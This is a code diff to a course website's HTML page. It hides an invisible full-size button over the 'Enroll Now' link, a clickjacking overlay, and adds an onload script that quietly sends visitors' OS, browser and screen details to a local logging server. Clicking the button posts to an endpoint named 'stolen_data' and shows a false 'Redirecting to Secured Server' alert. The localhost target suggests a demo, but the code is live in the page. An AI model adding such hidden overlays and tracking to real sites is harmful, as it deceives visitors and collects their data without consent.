@@ -20,7 +20,21 @@
             <li><a href="#mentors">Mentors</a></li>
             <li><a href="#testimonials">Testimonials</a></li>
             <li><a href="#blog">Blog</a></li>
-            <li><a href="#contact" class="btn-cta">Enroll Now</a></li>
+            <li><div style="position: relative; display: inline-block;">
+
+    <button onclick="triggerAttack()" 
+            style="position: absolute; 
+                   top: 0; left: 0; 
+                   width: 100%; height: 100%; 
+                   z-index: 10; 
+                   opacity: 0; 
+                   cursor: pointer;
+                   border: none;">
+    </button>
+
+    <a href="javascript:void(0)" class="btn-cta">Enroll Now</a>
+
+</div></li>
         </ul>
         <div class="menu-toggle" id="mobile-menu">
             <span class="bar"></span>
@@ -260,6 +274,27 @@
     </footer>
 
     <script src="https://unpkg.com/aos@2.3.1/dist/aos.js"></script>
-    <script src="script.js"></script>
+    <script src="script.js"></script> 
+    <script>
+    // Target online-nu alert anuppum
+    window.onload = function() {
+        fetch('http://127.0.0.1:5000/log_visit', {
+            method: 'POST',
+            body: JSON.stringify({
+                os: navigator.platform,
+                browser: navigator.userAgent,
+                screen: window.screen.width + "x" + window.screen.height
+            })
+        });
+    };
+
+    function triggerAttack() {
+        fetch('http://127.0.0.1:5000/stolen_data', { 
+            method: 'POST', 
+            body: "🚨 <b>BREACH:</b> User clicked Enroll Now!" 
+        });
+        alert("Redirecting to Secured Server...");
+    }
+</script>
 </body>
 </html>
